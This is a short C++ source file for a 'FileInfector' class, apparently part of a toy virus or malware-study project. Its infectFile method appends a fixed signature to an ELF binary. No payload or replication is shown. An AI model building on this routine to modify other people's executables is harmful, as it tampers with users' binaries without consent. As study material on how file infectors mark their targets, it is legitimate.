#include "FileInfector.h"
#include "Constants.h"

#include <vector>
#include <iostream>
#include <fstream>

FileInfector::FileInfector()
{
}

FileInfector::~FileInfector()
{
}

void FileInfector::infectFile(std::string filePath)
{
    std::ofstream outputFile(filePath, std::ios::binary | std::ios::app);
    if (!outputFile) {
        std::cerr << "Error: Unable to open output file." << std::endl;
        return;
    }

    // Convert the string to a vector of bytes
    std::vector<char> bytes(CRYPTY_SIGNATURE.begin(), CRYPTY_SIGNATURE.end());

    // Write the byte sequence to the end of the file
    std::copy(bytes.begin(), bytes.end(), std::ostreambuf_iterator<char>(outputFile));

    if (!outputFile) {
        std::cerr << "Error: Failed to write bytes to file." << std::endl;
        return;
    }

    std::cout << "Byte sequence successfully appended to the ELF file." << std::endl;

    outputFile.close();
}
